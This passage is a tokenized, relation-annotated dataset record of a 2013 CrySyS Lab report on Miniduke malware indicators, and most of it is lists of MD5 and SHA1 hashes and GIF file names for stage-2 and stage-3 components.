"P21", "h": 246, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 247, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 248, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 249, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 250, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 251, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 252, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 253, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 254, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 255, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 256, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 257, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 258, "t": 3, "evidence": [19, 71]}, {"r": "P21", "h": 395, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 399, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 401, "t": 3, "evidence": [19, 135]}, {"r": "P21", "h": 403, "t": 3, "evidence": [19, 135]}, {"r": "P21", "h": 405, "t": 3, "evidence": [19, 136]}, {"r": "P21", "h": 407, "t": 3, "evidence": [19, 136]}, {"r": "P21", "h": 409, "t": 3, "evidence": [19, 137]}, {"r": "P21", "h": 411, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 413, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 429, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 431, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 435, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 437, "t": 3, "evidence": [19, 143]}, {"r": "P21", "h": 439, "t": 3, "evidence": [19, 144]}, {"r": "P21", "h": 441, "t": 3, "evidence": [19, 144]}, {"r": "P21", "h": 443, "t": 3, "evidence": [19, 144]}, {"r": "P21", "h": 445, "t": 3, "evidence": [19, 145]}, {"r": "P21", "h": 447, "t": 3, "evidence": [19, 145]}, {"r": "P21", "h": 449, "t": 3, "evidence": [19, 145]}, {"r": "P21", "h": 451, "t": 3, "evidence": [19, 146]}, {"r": "P21", "h": 432, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 396, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 453, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 455, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 400, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 397, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 402, "t": 3, "evidence": [19, 135]}, {"r": "P21", "h": 404, "t": 3, "evidence": [19, 135]}, {"r": "P21", "h": 406, "t": 3, "evidence": [19, 136]}, {"r": "P21", "h": 408, "t": 3, "evidence": [19, 136]}, {"r": "P21", "h": 410, "t": 3, "evidence": [19, 137]}, {"r": "P21", "h": 412, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 414, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 430, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 433, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 436, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 438, "t": 3, "evidence": [19, 143]}, {"r": "P21", "h": 440, "t": 3, "evidence": [19, 144]}, {"r": "P21", "h": 442, "t": 3, "evidence": [19, 144]}, {"r": "P21", "h": 444, "t": 3, "evidence": [19, 144]}, {"r": "P21", "h": 446, "t": 3, "evidence": [19, 145]}, {"r": "P21", "h": 448, "t": 3, "evidence": [19, 145]}, {"r": "P21", "h": 450, "t": 3, "evidence": [19, 145]}, {"r": "P21", "h": 452, "t": 3, "evidence": [19, 146]}, {"r": "P21", "h": 434, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 398, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 454, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 456, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 542, "t": 3, "evidence": [19, 236]}, {"r": "P21", "h": 539, "t": 3, "evidence": [19, 223]}, {"r": "P21", "h": 541, "t": 3, "evidence": [19, 233]}, {"r": "P21", "h": 536, "t": 3, "evidence": [19, 216]}, {"r": "P21", "h": 537, "t": 3, "evidence": [19, 216]}, {"r": "P21", "h": 538, "t": 3, "evidence": [19, 217]}, {"r": "P21", "h": 530, "t": 3, "evidence": [19, 207]}, {"r": "P21", "h": 526, "t": 3, "evidence": [19, 206]}, {"r": "P21", "h": 527, "t": 3, "evidence": [19, 206]}, {"r": "P21", "h": 523, "t": 3, "evidence": [19, 205]}, {"r": "P21", "h": 512, "t": 3, "evidence": [19, 204]}, {"r": "P21", "h": 513, "t": 3, "evidence": [19, 204]}, {"r": "P21", "h": 514, "t": 3, "evidence": [19, 204]}, {"r": "P21", "h": 515, "t": 3, "evidence": [19, 204]}, {"r": "P21", "h": 520, "t": 3, "evidence": [19, 205]}, {"r": "P21", "h": 521, "t": 3, "evidence": [19, 205]}, {"r": "P21", "h": 531, "t": 3, "evidence": [19, 207]}, {"r": "P21", "h": 517, "t": 3, "evidence": [19, 204]}, {"r": "P21", "h": 506, "t": 3, "evidence": [19, 195]}, {"r": "P21", "h": 501, "t": 3, "evidence": [19, 188]}, {"r": "P21", "h": 503, "t": 3, "evidence": [19, 189]}, {"r": "P21", "h": 502, "t": 3, "evidence": [19, 188]}, {"r": "P21", "h": 504, "t": 3, "evidence": [19, 189]}, {"r": "P21", "h": 500, "t": 3, "evidence": [19, 184]}], "title": "201302CrySysMiniDuke", "sents": [["Miniduke", ":", "Indicators", "v1.00", "(", "Feb", "27", ",", "2013", ")", "Technical", "Report", "by", "Laboratory", "of", "Cryptography", "and", "System", "Security", "(", "CrySyS", "Lab", ")", "http://www.crysys.hu/"], ["Budapest", "University", "of", "Technology", "and", "Economics", "Department", "of", "Networked", "Systems", "and", "Services", "http://www.bme.hu/"], ["Authors", ":", "CrySyS", "Malware", "Intelligence", "Team", "."], ["Based", "on", "joint", "work", "with", "Kaspersky", "Labs", "GREAT", "Team", "Document", "history"], ["27/02/2013", "Initial", "release", "Table", "of", "contents", "1", "."], ["Introduction", "............................................................................................................................................."], ["4", "2", "."], ["Known", "malware", "samples", "....................................................................................................................."], ["5", "3", "."], ["Detection", "of", "the", "running", "malware", "................................................................................................"], ["11", "4", "."], ["C&C", "communication", "..........................................................................................................................."], ["13", "4.1", "."], ["Detection", "of", "C&C", "communications", ".............................................................................................................."], ["15", "4.2", "."], ["Initial", "C&C", "communication", "............................................................................................................................"], ["15", "4.3", "."], ["Other", "indicators", "of", "C&C", "communication", ":", "Google", "and", "Twitter", "queries", "......................................", "18", "1", "."], ["Introduction"], ["Our", "malware", "analysis", "team", "in", "the", "CrySyS", "Lab", ",", "Budapest", "worked", "together", "with", "Kaspersky", "Labs", "on", "the", "analysis", "of", "the", "Miniduke", "malware", "."], ["Our", "participation", "in", "this", "research", "was", "justified", "by", "a", "detected", "Hungarian", "incident", "."], ["A", "detailed", "report", "on", "the", "results", "of", "our", "joint", "efforts", "has", "been", "published", "by", "Kaspersky", "Labs", "Securelist", "blog", "site", "(", "see", "link", "below", ")", "."], ["The", "Kaspersky", "Labs", "report", "describes", "what", "we", "currently", "know", "about", "the", "operation", "of", "Miniduke", "including", "its", "stages", ",", "and", "also", "information", "on", "the", "C&C", "infrastructure", "and", "communications", "."], ["In", "this", "report", ",", "we", "summarize", "the", "indicators", "of", "a", "Miniduke", "infection", ",", "and", "give", "specific", "hints", "on", "its", "detection", "."], ["The", "Kaspersky", "Labs", "report", "is", "available", "at", "https://www.securelist.com/en/blog/208194129/The_MiniDuke_Mystery_PDF_0_day", "_", "Government_Spy_Assembler_Micro_Backdoor", "2", "."], ["Known", "malware", "samples"], ["The", "available", "malware", "samples", "are", "highly", "obfuscated", ",", "and", "compiled", "by", "a", "polymorphic", "compiler", "."], ["The", "attackers", "were", "able", "to", "produce", "new", "variants", "with", "only", "a", "few", "minutes", "difference", "between", "compile", "times", "."], ["Therefore", "the", "number", "of", "distinct", "samples", "could", "be", "very", "large", "."], ["bg_<sthg>.gif", "and", "bg_<sthg>.gif_dec", "refers", "to", "pieces", "of", "stage", "2", "of", "the", "malware", ",", "which", "are", "downloaded", "from", "the", "C&C", "server", "by", "the", "stage", "1", "code", "."], ["bg_<sthg>.gif", "is", "a", "gif", "file", "that", "contains", "encrypted", "code", ",", "bg_<sthg>.gif", "is", "the", "corresponding", "decrypted", "file", "."], ["bg_<sthg>.gif", "is", "generally", "24484", "bytes", "long", ",", "while", "bg_<sthg>.gif_dec", "is", "22784", "bytes", "long", "."], ["3e71a9f492101bde28cf9f024d87b496"], ["a4ad6b55b1bc9e16123de1388f6ef9bf", "92a2c993b7a1849f11e8a95defacd2f7"], ["297ef5bf99b5e4fd413f3755ba6aad79", "06def6c642dcbd58d0291ac110a57274"], ["2679e112f908fbf4ac96d87f7fdc46ca", "afe0190820b3edc296daefe6d1611051", "e196fa056d1a728d9ba9654fbc482777", "7049aa581874752093bb98850ff45dac", "441ee6a307e672c24d334d66cd7b2e1a", "e975e87bec844c882bf6d60604fc996b", "a58e8e935341b6f5cc1369c616de3765"], ["0a2da3c2c6b94c925459bc5e32bbb03c", "d2f39019bfa05c7e71748d0624be9a94", "0a5c9055c2b35bee78c911dfc29fe1a4", "ecd349138a6ef7d7ca40b9ce70dbb575"], ["21f16767e53da7fef8a1b5d4159256a9"], ["935892bb70d954efdc5ee1b0c5f97184", "bba6b0d31553cd8df0c45b85c0495816", "48bbce47e4d2d51811ea99d5a771cd1a"], ["b47b36484cfb0ab38ef481e23275fafb", "b68677e04fcc9103560bb0a5e5c7303f", "5e757aa35087ca7c479c82d0d5502f51", "27212d5e5d40a5e5c1742aac58dc59a8", "4193796cffa19e2e5cace58e9f10c599", "aab06d4ab78336b7315201637d9f1b0e", "474fa3c28d867f7113c060020b3e268b", "05d10323111f02233163a6742556c974"], ["f0b327565c25128ad15f9c378bc4ea60", "d9b68522053396644bcb72448d6cf327", "af906032917674f1f39a260b2b9fe0fb", "6507f6b1e2ce05dccf329b8cab078071"], ["633b59e7b97ef4574804ca35669fbf95"], ["b100d530d67cfbe76394bb0160567382", "203a6ff36ee2cd58daf5680b5a6890ec"], ["2d552b20e8164f3d4250fd8871b11b0f", "877a34931b087d04d387633824d9c813"], ["e990e0d1ee90cd10c4be7bfde6cc3e5a", "c8373db89be0a155673e0cd414442fc1", "8233c532bfcc4ccf2831765eae084409", "bg_aefk.gif", "bg_aefk.gif.dec", "bg_afvd.gif", "bg_afvd.gif.dec", "bg_dafd.gif", "bg_dafd.gif.dec", "bg_dasfs.gif", "bg_dasfs.gif.dec", "bg_dfdsh.gif", "bg_dfdsh.gif.dec", "bg_dfell.gif", "bg_dfell.gif.dec", "bg_dfesik.gif", "bg_dfesik.gif.dec", "bg_dfeu.gif", "bg_dfeu.gif.dec", "bg_dfew.gif", "bg_dfew.gif.dec", "bg_dfews.gif", "bg_dfews.gif.dec", "bg_dflj.gif", "bg_dflj.gif.dec", "bg_dfoiu.gif", "bg_dfoiu.gif.dec", "bg_dfrio.gif", "bg_dfrio.gif.dec", "bg_dfwe.gif", "bg_dfwe.gif.dec", "bg_dsaf.gif", "bg_dsaf.gif.dec", "bg_dsaffe.gif", "bg_dsaffe.gif.dec", "bg_dsef.gif", "bg_dsef.gif.dec", "bg_dsert.gif", "bg_dsert.gif.dec", "bg_dwed.gif", "bg_dwed.gif.dec", "bg_edf.gif", "bg_edf.gif.dec", "d39f2202b421561cfc36a8802184685c", "2d87ab160291664d62445548a2164c60", "e37d7cc17070df4917f194968073e14b", "fdc96d77af6fdae487002e32d61df123", "f80af1246744f8eedae152dc44ebfc51", "2dcd049c591644e35102921a48799975"], ["7aef3a8776c7a58ef01542ff7d4c83e8", "b540a9f81f538f4f324db422e7bb4559"], ["ed67c4aca1d25d1083bb8ba65573a4a9", "1528567b1a2f1da31d602ce1ddfd8918", "bedb8231a7b0d8b13a53e7e1fdff04dd", "7056df132f448d45b4781c2ddc27b113", "d469a7d7750c964419c0aaa0347c7a9c", "d27c2cce5ceb8a62c766a2ae4d50730e"], ["5add9bb805c8956931739308369b2c45", "1e0c1f4271c5cadcad7b66bef5863b83", "4c3664dce0b336f4262b5ec1374f9690", "ab2d8a0d5b03d40f148f2f907b55f9f1", "113e5ab47e1efae97fd7641276055984"], ["2f3fd599020fa857d28fe3e2bb26c6ca", "55b25ccb549df610c34072556abf88fa", "fd85ca2a0da6b7b7c93e1ad0efa25c4c", "b248d1b0ee26cb4393efe4ffab0c8c91", "1667a3a01b906b1e47328ad601d68d1e", "f7ed059147802b503f1792694a167e74", "c92252487615d5379317febc22dba7d4", "34f62a12bc36fd119734a322ef666f14", "efb1246ee89798a2d9182ad9bbcbb41a", "85388d2adf7b8608f1d3468b4e07920d"], ["7829cb4ca55fcda8928e0f63ee86c6c2", "882957f0845d54d83cd0389264d9ba8f"], ["c519eef57001ad3ae60cdcb0009bf778"], ["5935bc0845e6b192c163fc77ee3c00bf"], ["381691b297f7f5694709e21ad61ec645", "cfb4e25bd9dbf5afef6a56d468de91a1", "c8d75ed7835fdb543200298216d1d0f4", "cde0900f94c4c360540735028d6be71c", "aa48cb8e26ecdf16f22b0585a5fd96bf"], ["e498ef07eba70804e90aa303cbd4c20b"], ["798bea2f1e2e6fc8edcedea548877aa2", "78cca6a7d4aed656c9683aeb18732e95"], ["241363e7641cfa7d9063013ed44bf87b", "7f77c4839d09cdf930b021cbdd89410e", "b8e89f9908262b5385623c0e39d6b940", "e2019b16e587ef1d3e05df164a01101c", "3649fc6e3222721826485131142846b4", "4fbe44c36d6c1a2b74733c1cd0d34cbf", "1051aeace46a4bd33d0167cacd42b12b", "0e02b78673a9cf2db7a0cc5b00e306e9"], ["3c188004c98934beaafa7a52ee397f90", "2bd1572913eed832451b768c6c4c610c", "089b3f42a96f4f74b05e858cdf8db3fc", "58cf3b1adb7981938848c018d2e52ecb", "014030329695cabdb9966a3006eae07a"], ["7ae8ac5de85b0777868281f64237197c", "b8088f6594dd8cba31b4f52a2d91f40e", "b24f414809671328ced9cec73ff5ca3a", "6dca5669aad4933b0629571ce6c99998", "cf1e3f0b0d3a9e009bea821b4bffa387", "bg_edf_v2.gif", "bg_edf_v2.gif.dec", "bg_edfsa.gif", "bg_edfsa.gif.dec", "bg_edse.gif", "bg_edse.gif.dec", "bg_eefds.gif", "bg_eefds.gif.dec", "bg_efd.gif", "bg_efd.gif.dec", "bg_efdse.gif", "bg_efdse.gif.dec", "bg_efed.gif", "bg_efed.gif.dec", "bg_efwe.gif", "bg_efwe.gif.dec", "bg_ekjf.gif", "bg_ekjf.gif.dec", "bg_ekks.gif", "bg_ekks.gif.dec", "bg_elfj.gif", "bg_elfj.gif.dec", "bg_elj.gif", "bg_elj.gif.dec", "bg_esd.gif", "bg_esd.gif.dec", "bg_ewfed.gif", "bg_ewfed.gif.dec", "bg_ewwe.gif", "bg_ewwe.gif.dec", "bg_fdfe.gif", "bg_fdfe.gif.dec", "bg_fed.gif", "bg_fed.gif.dec", "bg_fefsf.gif", "bg_fefsf.gif.dec", "bg_fked.gif", "bg_fked.gif.dec", "bg_fwds.gif", "bg_fwds.gif.dec", "bg_kefs.gif", "bg_kefs.gif.dec", "bg_kei.gif"], ["bg_kei.gif.dec"], ["bg_keio.gif", "bg_keio.gif.dec"], ["bg_kje.gif", "bg_kje.gif.dec", "bg_kkf.gif", "bg_kkf.gif.dec", "bg_koe.gif"], ["bg_koe.gif.dec", "bg_ldfe.gif", "bg_ldfe.gif.dec", "bg_leo.gif"], ["bg_leo.gif.dec", "bg_lfe.gif", "bg_lfe.gif.dec", "bg_lkje.gif", "22036375458057994e5fa81474393465", "cffd063dacff1830de63c833e89facc1"], ["168f3d5a88f695c157446549e4770dd9"], ["ffd8ab9d37519ffa15a86157422a6517", "8282eb6d6f20c5de6e7f4ae3a42438d2", "fed5e99509537e0f46a6e7ab4f9f3587", "aaa1633a0b8108763334bbcd590848d1"], ["5b0f68e23817494f52c84e8e38c6a30d"], ["ffefe16d581340c1e49f585a576a1fd8", "492134baaf2059bdb799c9c7483d1926", "a67ad3e2a020f690d892b727102a759b"], ["b664ce0888cdf5180813be0cfcfcf8ee", "687a596db9031b38f23064d45c0a4ddb", "8e4505e28766ab08db27ca91e5ecc839", "04d5e76049db2c1e799e70231107339a", "00457691525bf21484827bcd8a01828b"], ["e1a659473ae1e828508309b77da13783"], ["1a1afc3d26c82c4b0facf5ca8a5dcb36", "f648bd9d68bd016739988bb71bf5486b", "42ccad0b47cb1836e7e09869b41ebdb2", "8ee3cf5e37480ee1324146feef30de02", "796f0698644f61fdcd7da04bf590544e", "2ab25d33d61cf4cfbac92c26c7c0598e"], ["0b02262772b8c2c5e54dae99bdb07029", "728f9c1d9dd0635a4b205f2d4d68a887", "95694878bba2e099ea9ca1b5deeedb7a", "f19345e0e5aecc0da45b4c110591bdd9", "bg_lkje.gif.dec", "bg_lkjkef.gif", "bg_lkjkef.gif.dec", "bg_oef.gif", "bg_oef.gif.dec", "bg_ojlro.gif", "bg_ojlro.gif.dec", "bg_qdf.gif", "bg_qdf.gif.dec", "bg_qrg.gif", "bg_qrg.gif.dec", "bg_rie.gif", "bg_rie.gif.dec", "bg_ruie.gif", "bg_ruie.gif.dec", "bg_sasd.gif", "bg_sasd.gif.dec", "bg_sdef.gif", "bg_sdef.gif.dec", "bg_sdefk.gif", "bg_sdefk.gif.dec", "bg_sfef.gif", "bg_sfef.gif.dec", "bg_ureio.gif", "bg_ureio.gif.dec", "bg_wdf.gif"], ["bg_wdf.gif.dec", "Figure", "1", "\u2013", "MD5", "checksum", "list", "of", "pieces", "of", "stage", "2", "of", "the", "known", "versions"], ["8d7e8b7871b634ad67b13e55aebb7fb7a954ff90", "1e6b9414fce4277207aab2aa12e4f0842a23f9c1", "ed64fba3195f52192c65cad491a28bf18f6f67a3", "28a43eac3be1b96c68a1e7463ae91367434a2ac4", "cc492d4b188f4cf5003f8b6954f6dd071a8066c2", "97a374bac7572d44ca8c73c49d3d6ddeade90e34", "81612fc09cfae280cc35b1331c832a5a87c2edff", "b32b675699a59b4272a956dbd81738d02d4ca8a4", "352a2cf4bb2c9e300ce9a51740f238c9282ca6e4", "2ceae0f5f3efe366ebded0a413e5ea264fbf2a33", "05c539ca5dfbfab8e61ffab4b7b13ba2a5e7154c", "ad9734b05973a0a0f1d34a32cd1936e66898c034"], ["f3c6c0c73dcccbf44521763985bbf1ad6e3317eb", "a9e529c7b04a99019dd31c3c0d7f576e1bbd0970"], ["5e33dd2fcf0c32d3fc458b2d99a0033461c3a6ea", "69d95479d520e016ce733541ec815aafe16ead04", "b995e16fc3a981d693778e370e5ba19861412db6", "efcb9be7bf162980187237bcb50f4da2d55430c2", "39952ab95453de127a6a61f4e67c3109ca8ff93e", "1ba5bcd62abcbff517a4adb2609f721dd7f609df"], ["a9e9cd4b2b1ec4efcdbce79b582f874cebe3ebd1", "a6c18fcbe6b25c370e1305d523b5de662172875b", "5cb2d1005caccbe451f2bd2c6314283ba04a7401", "d99ddb6c4fc13f97c6a77f84ba31533ca2e1d9e0"], ["d4c10e9248392936cf94a168a792d4b9942398a8", "832d80c16886a7529aa22c962a00a7bb3fe1ff77", "78e20444a96f4405aae2a26e1a013634c81d7328", "bg_aefk.gif", "bg_aefk.gif.dec", "bg_afvd.gif", "bg_afvd.gif.dec", "bg_dafd.gif", "bg_dafd.gif.dec", "bg_dasfs.gif", "bg_dasfs.gif.dec", "bg_dfdsh.gif", "bg_dfdsh.gif.dec", "bg_dfell.gif", "bg_dfell.gif.dec", "bg_dfesik.gif", "bg_dfesik.gif.dec", "bg_dfeu.gif", "bg_dfeu.gif.dec", "bg_dfew.gif", "bg_dfew.gif.dec", "bg_dfews.gif", "bg_dfews.gif.dec", "bg_dflj.gif", "bg_dflj.gif.dec", "bg_dfoiu.gif", "bg_dfoiu.gif.dec", "bg_dfrio.gif", "bg_dfrio.gif.dec", "bg_dfwe.gif", "4ec769c15a9e318d41fd4a1997ec13c029976fc2", "1f07d80b16a539cc6d7fccd2bb37ddaaf734352e"], ["f762ff3801d1e4ad1360d50e54f2894211cd8958"], ["be9aa1776fbd5b05fea230ff77654e8a9d29a802"], ["8da1aca62c3a19ac0f9b85fb48b711e6b946bc77"], ["b524a190d74a1b8824a049936e17aee714f5bd23"], ["43fa0d5a30b4cd72bb7e156c00c1611bb4f4bd0a", "4213387b4e4cf0bb2499b06b4fecd90af7d7257a"], ["92465134302755552eb82bb39bb3327a08112e02", "0e924796517cbb62f3a30740eb60ac1a9829b24d"], ["53140342b8fe2dd7661fce0d0e88d909f55099db", "f8c6f1cc3b937e0d7501c098776945bdc7c83856", "582dbde44753e0af4996ddb63ab088221b2e49a2"], ["109e1e387f8b2bb8d92f45e79881809384e9ae54"], ["c39d0b12bb1c25cf46a5ae6b197a59f8ea90caa0"], ["6b1dd4fa0f9570760c02bbcf44acf74d752aa8f8"], ["5551408323086f31d9bc3358ab5b2ed4dde86c5d", "d3a1b7d35b314139ab87bf4cd3e7ce752b37e56a"], ["30b377e7dc2418607d8cf5d01ae1f925eab2f037"], ["280aadae40cb340894f17ce1ca00f7dda3eb4425", "6b56ff806ee0b094b4846f494257e84b62bee35f"], ["00da3d559f36e842d2411b8c47ee377650722da0"], ["a32817e9ff07bc69974221d9b7a9b980fa80b677", "0e5a4768d7020b336f58ea4d521756401c24efd4"], ["939ac22e8425654a57753bd4083e8cd16d337ee0", "f7932b0a5b710d4e7e698d3c990a875771698fce", "c9cedca208049c7bf08cba544ef32bb7a3ebe37a"], ["25a7c6b0f48e68f4ca135ecec46d3ad190d518d9"], ["9689ebbeeb544b9d1c00b71f3b886aeebcb92138"], ["95ad87fd28d7367fd5323d5281c044238dd4c303"], ["36b969c1b3c46953077e4aabb75be8cc6aa6a327", "b9d576a47cfebb2c3ff0ecc8cd7c352e6ce32b23", "366b41bcac6259c77ed5792becae75670a74c4c1", "8e3e6ea2c79c9994ded4922358898814efd2cbe0", "367030d5cf3ce7e9ef7770367f04c7dd88332374", "95d8b5e4bff4c35a7ef32f1cbb7e385a331c6138", "b42ab1b2b257f65ad18823ecb2f284c8fc118c26"], ["b72df8e1f24c4e05699fc892cfd536053d762065"], ["73366c1eb26b92886531586728be4975d56f7ca5"], ["554cd374591ee8bf0f062567c17beae54f9055ff"], ["6956a776f3395d1aee8a3c27e9db5eb2d38db32b", "40f8ee78fb9969c8ec9a795cb827dfb427c19036", "1ddcd6b1475f016d04d8a43ccb03abeb83371eda"], ["0cd54a0c3f7fdaf7a83e6a1ff818daf514e81e7a", "5acaea49540635670036dc626503431b5a783b56"], ["fef95bdb9f984bcbb89f3a29928263dfc01aef72", "f62600984c5086f2da3d70bc1f5042cf464f928d", "1747a7a74a6fac25bc4315b8d3a8311ce8a082e2", "501452d2c21bb8248e068932920554db6204a7f2", "4bba1d30c971fdd23131e8ec1d768066b400f0a1", "49889f3db0d70b716aa3cb2ab571f0b4a56a6f99"], ["551bf2d2268dba5d22e91fdd7ca9832bc8874bcc"], ["824d383bb5093e3a6c232afca3293779a297c0ad", "95760332c76b32919d4c053b3360ecad4811256a"], ["f484d874097ca95e5a86f43a15ef184bec1e972a"], ["b1dec7f17381cf41699184ec4bc591ff20b451b3", "296fd4c5b4bf8ea288f45b4801512d7dec7c497b", "e6429ea40864e36dd6a25cab00b416ff207825a7", "df64ac1bb4ca177539e3fa669dcc471d3093ff2f", "bg_dfwe.gif.dec", "bg_dsaf.gif", "bg_dsaf.gif.dec", "bg_dsaffe.gif", "bg_dsaffe.gif.dec", "bg_dsef.gif", "bg_dsef.gif.dec", "bg_dsert.gif", "bg_dsert.gif.dec", "bg_dwed.gif", "bg_dwed.gif.dec", "bg_edf.gif", "bg_edf.gif.dec", "bg_edf_v2.gif", "bg_edf_v2.gif.dec", "bg_edfsa.gif", "bg_edfsa.gif.dec", "bg_edse.gif", "bg_edse.gif.dec", "bg_eefds.gif", "bg_eefds.gif.dec", "bg_efd.gif", "bg_efd.gif.dec", "bg_efdse.gif", "bg_efdse.gif.dec", "bg_efed.gif", "bg_efed.gif.dec", "bg_efwe.gif", "bg_efwe.gif.dec", "bg_ekjf.gif", "bg_ekjf.gif.dec", "bg_ekks.gif", "bg_ekks.gif.dec", "bg_elfj.gif", "bg_elfj.gif.dec", "bg_elj.gif", "bg_elj.gif.dec", "bg_esd.gif", "bg_esd.gif.dec", "bg_ewfed.gif", "bg_ewfed.gif.dec", "bg_ewwe.gif", "bg_ewwe.gif.dec", "bg_fdfe.gif", "bg_fdfe.gif.dec", "bg_fed.gif", "bg_fed.gif.dec", "bg_fefsf.gif", "bg_fefsf.gif.dec", "bg_fked.gif", "bg_fked.gif.dec", "bg_fwds.gif", "bg_fwds.gif.dec", "bg_kefs.gif", "bg_kefs.gif.dec", "bg_kei.gif"], ["bg_kei.gif.dec", "bg_keio.gif", "bg_keio.gif.dec", "c20ba675d5df997623c7da4c79ca9be5c995eb3c", "4a88e007bbd9a729fde016de1c9709cd06818ef7"], ["ff2319abaeded930feb0ddbcb47fdfc2d57e182c"], ["a4445f1ae3e2d5196eb4292121e6cf0d1cc5dad2", "7419bfc9d393b2a9fbd09c18ea4a31ce98d60342"], ["7e57c80574fdebf5f3fedce5a2ebb62d49de1345", "5316a02c1e120885a2382e95a3eb0c1f8fd69551"], ["60efd28c07d07d10d50b5ad00c243e17e7f1707e", "862305dedb93100aee6ef07c858c3a0b6878620e"], ["634a1649995309b9c7d163af627f7e39f42d5968", "997d5765e4cc7475fa2cf64233af9b51ddf219f2"], ["81c99d19ea8065cfff6dc76a950b9d1b25a5f7a9"], ["c6fd105437e9ddd914721f3ba7fcbc6bef39067a"], ["6f530edc584a18df98ee7fade2dd03b610955e23", "8802cbff6f2b39932e9b699d89a6f3a407cd39a7", "c0c26060b4f003322f3cda9dee294fd6221b85da", "1160010b1df2601fe176353be76ba1a922425dc6", "edf74413a6e2763147184b5e1b8732537a854365", "49989446d542b1face2c031a205a702178dc2496"], ["ebe78cc14bb8e13374da4264c41df24dc0ceeaa7", "071b67b2645e574f6fc5ba889c041bb2ee85f6d8"], ["31ab6830f4e39c2c520ae55d4c4bffe0b347c947", "53d1c812510c51d0b6eec767d15f740ea54135b5"], ["223c7eb7b9dde08ee028bba6552409ee144db54a", "be1a53afaab89f47a91a21b0d65415af1b5d1bff"], ["3171957cfeb7b415f21b04f9a587b0c339b5c0e3", "898a3e5e34eeb3349aa6f291c31195dc02bb9530", "f0f7d755add2305bceaacfe6840d61ccd5f03b0f", "0b1e28ecd5b4eb14519470775dce965c63579640"], ["683104d28bd5c52c53d2e6c710a7bd19676c28b8"], ["ba884173e98a4f2b6af6acc7f702ead14b146960"], ["f30ba7eeebd97843f0bcf9c3930741fa29c132cd", "6c889228219012b25387bf3e063136b994d2dcac"], ["e804f3bf72bfda867fd3725a82da6212e29dbfc4"], ["07e26464e17a750bb60665c377b41efd23c440b6", "827de388e0feabd92fe7bd433138aa35142bd01a"], ["28ec7eb49f7af3ca7787e4566b144d8ea544a78d", "08a4baa154dc41d7dee9bd424c2679253c743ee3", "84fa36acb51a0569ed931f1db5d44ec907dcb624", "d81b0705d26390eb82188c03644786dd6f1a2a9e", "bg_kje.gif", "bg_kje.gif.dec", "bg_kkf.gif", "bg_kkf.gif.dec", "bg_koe.gif"], ["bg_koe.gif.dec", "bg_ldfe.gif", "bg_ldfe.gif.dec", "bg_leo.gif"], ["bg_leo.gif.dec", "bg_lfe.gif", "bg_lfe.gif.dec", "bg_lkje.gif", "bg_lkje.gif.dec", "bg_lkjkef.gif", "bg_lkjkef.gif.dec", "bg_oef.gif", "bg_oef.gif.dec"], ["bg_ojlro.gif", "bg_ojlro.gif.dec", "bg_qdf.gif", "bg_qdf.gif.dec", "bg_qrg.gif", "bg_qrg.gif.dec", "bg_rie.gif", "bg_rie.gif.dec", "bg_ruie.gif", "bg_ruie.gif.dec", "bg_sasd.gif", "bg_sasd.gif.dec", "bg_sdef.gif", "bg_sdef.gif.dec", "bg_sdefk.gif", "bg_sdefk.gif.dec", "bg_sfef.gif", "bg_sfef.gif.dec", "bg_ureio.gif", "bg_ureio.gif.dec", "bg_wdf.gif"], ["bg_wdf.gif.dec", "Figure", "2", "\u2013", "SHA1", "checksum", "list", "of", "pieces", "of", "stage", "2", "of", "the", "known", "samples", "<", "id>.gif", "files", "are", "pieces", "of", "stage", "3", "codes", "prepared", "for", "specific", "victims", "with", "<", "i", "d", ">", "used", "as", "an", "ID", "."], ["These", "are", "typically", "334093", "byte", "long", "files", "with", "a", "13", "-", "byte", "long", "gif", "header", "."], ["Below", ",", "we", "list", "the", "hashes", "of", "these", "files", ";", "in", "case", "of", "the", "decrypted", "files", "with", ".gif_dec", "extension", ",", "we", "list", "the", "hashes", "for", "the", "internal", "decrypted", "PE", "file", "."], ["07a9975d7d96ff3b56de024ab2017582"], ["43cd449e3b0c1ecde8136eeb710de233", "85a645c42e2fcf718c211ebc6cbc71b8", "a9315dc0ff95809839af3b95e7de329d", "92ff4df1d079a003ae2a8ac47dd5e81b", "bf0253ee830b498bd442c3b97aec1270"], ["c48d0822eedd75c9c56f688fb8a05259", "44ee71de720fc1a50c919bc5a01c592d", "626489f8cafacb1b24fe6ecf0db52f23", "*", "1109821546.gif", "*", "174239657.gif"], ["*", "2334309658.gif", "*", "2618653991.gif"], ["*", "2627081433.gif", "*", "3100425864.gif"], ["*", "3198217296.gif"], ["*", "3946889701.gif", "*", "3979106736.gif", "03f8485cacb0458194d2bbef9f33cc06", "738c60fff066934b6f33e368cfe9a88c", "cf59ed2b5473281cc2e083eba3f4b662", 